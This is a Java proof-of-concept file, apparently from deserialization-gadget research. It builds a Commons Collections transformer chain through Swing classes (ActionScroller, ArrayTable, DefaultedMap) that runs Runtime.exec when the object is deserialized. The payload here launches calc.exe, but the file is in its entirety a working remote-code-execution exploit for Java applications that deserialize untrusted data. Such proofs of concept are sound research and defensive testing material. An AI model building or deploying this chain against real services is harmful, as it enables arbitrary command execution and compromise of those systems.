package com.example.CC3;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.FastHashMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.DefaultedMap;

import javax.swing.event.SwingPropertyChangeSupport;

public class POC_24 {

    /***
     * run with action_equals.jar
     */

    public static void main(String[] args) throws Exception {
        FastHashMap fhmap1 = new FastHashMap();
        fhmap1.put(TrAXFilter.class, "value1");

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
        };
        Transformer transformChain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(1) });
        ReflectionUtil.setField(transformChain, "iTransformers", transformers);
        DefaultedMap d = new DefaultedMap("1");
        d.put("key2", "value2");

        ReflectionUtil.setField(d, "value", transformChain);
        Object action = ReflectionUtil.createWithoutConstructor(Class.forName("javax.swing.plaf.basic.BasicSliderUI$ActionScroller"));
        Object arrayTable = ReflectionUtil.createWithoutConstructor(Class.forName("javax.swing.ArrayTable"));
        Object[] table = new Object[]{"key", fhmap1, "key", d};

        ReflectionUtil.setField(arrayTable, "table", table);
        SwingPropertyChangeSupport changeSupport = new SwingPropertyChangeSupport("bean");
        ReflectionUtil.setField(action, "arrayTable", arrayTable);
        ReflectionUtil.setField(action, "changeSupport", changeSupport);

        SerializeUtil.deserialize(SerializeUtil.serialize(action));
    }

}
